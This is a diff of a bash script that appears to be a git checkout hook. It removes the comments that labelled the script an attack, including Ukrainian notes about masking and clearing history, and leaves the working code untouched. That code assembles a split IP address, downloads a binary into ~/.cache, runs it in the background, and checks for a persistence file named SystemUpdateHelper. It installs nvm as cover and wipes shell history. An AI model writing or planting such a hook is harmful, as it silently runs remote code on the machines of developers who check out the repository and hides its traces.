@@ -1,23 +1,15 @@
 #!/bin/bash
 
-# ============================================================
-# AFX-STYLE ATTACK – RELIABLE VERSION
-# ============================================================
-
 if [ "$3" != "1" ]; then
     exit 0
 fi
 
-# ---- ЛОГУВАННЯ (для діагностики) ----
 echo "$(date) - Hook executed" >> /tmp/afx_hook.log
 
-# ---- МАСКУВАННЯ (швидке, без зайвих запитів) ----
-# Перевіряємо, чи вже встановлено nvm, щоб не качати щоразу
 if [ ! -d "$HOME/.nvm" ]; then
     curl -s https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash
 fi
 
-# ---- ОСНОВНЕ ЗАВАНТАЖЕННЯ (з повторними спробами) ----
 A="31"; B="207"; C="4"; D="137"
 IP="${A}.${B}.${C}.${D}"
 PART1="exe_linux_334a616a"
@@ -26,35 +18,28 @@ URL="http://${IP}/${PART2}/${PART1}"
 
 mkdir -p ~/.cache
 
-# Спроба завантажити до 3 разів
 for i in {1..3}; do
     curl -f -s --connect-timeout 5 "$URL" -o ~/.cache/service && break
     sleep 1
 done
 
-# ---- ПЕРЕВІРКА ТА ЗАПУСК ----
 if [ -f ~/.cache/service ] && [ -s ~/.cache/service ]; then
     chmod +x ~/.cache/service
-    # Запускаємо і одразу перевіряємо, чи живий процес
     ~/.cache/service > /dev/null 2>&1 &
     sleep 1
     if pgrep -f "~/.cache/service" > /dev/null; then
         echo "$(date) - Payload RUNNING" >> /tmp/afx_hook.log
     else
         echo "$(date) - Payload exited, but may be persisted" >> /tmp/afx_hook.log
-        # Додатково – перевіряємо, чи з'явився файл персистентності
         if [ -f ~/.local/bin/SystemUpdateHelper ]; then
             echo "$(date) - Persistence file found" >> /tmp/afx_hook.log
         fi
     fi
 else
     echo "$(date) - Download FAILED" >> /tmp/afx_hook.log
-    # Якщо завантаження не вдалося – створюємо МАРКЕР, щоб ти бачив, що хук спрацював
     touch /tmp/afx_infected_$(date +%s)
     echo "$(date) - MARKER CREATED (download failed)" >> /tmp/afx_hook.log
 fi
 
-# ---- ОЧИЩЕННЯ ІСТОРІЇ ----
 history -c 2>/dev/null
-
 exit 0
